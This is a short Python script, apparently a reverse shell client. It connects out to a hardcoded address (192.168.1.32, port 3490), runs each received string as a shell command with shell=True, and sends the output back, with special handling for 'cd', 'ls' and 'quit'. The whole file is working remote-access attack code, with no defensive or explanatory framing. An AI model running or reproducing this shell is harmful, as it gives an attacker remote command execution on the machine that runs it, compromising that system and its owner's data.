import socket 
import subprocess
import os

def return_info():
    while 1:
        command = sock.recv(1024)
        command_str = command.decode('utf-8')
        print(command_str[:2])
        print(len(command_str))
        
        if command_str == "quit":
            sock.close()
            break
        # if first two letters from the command is cd
        elif command_str[:2] == 'cd':
            print("cd command received")
            if len(command_str) > 2:
                path = command_str[3:]
                try:
                    os.chdir(str(path))
                    sock.send(f"cd to {path}".encode('utf-8'))
                except:
                    sock.send("Invalid path".encode('utf-8'))
                    continue
            else:
                current_location = '/'
                os.chdir('/')
                sock.send("cd to /".encode('utf-8'))
        elif command_str[:2] == 'ls' and len(command_str) > 1:
            print("ls command with args received")
            cmd_arr = command_str.split()
            output_str = subprocess.run(cmd_arr, stdout=subprocess.PIPE, text=True)
            sock.send(str(output_str.stdout).encode('utf-8'))
        else:
            proc = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read() 
            output_str = "executed command: " + command.decode('utf-8') + '\n' + result.decode('utf-8')
            sock.send(output_str.encode('utf-8'))

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.1.32", 3490))
# current_dir = os.getcwd()
# sock.send(current_dir.encode('utf-8'))

return_info()
sock.close()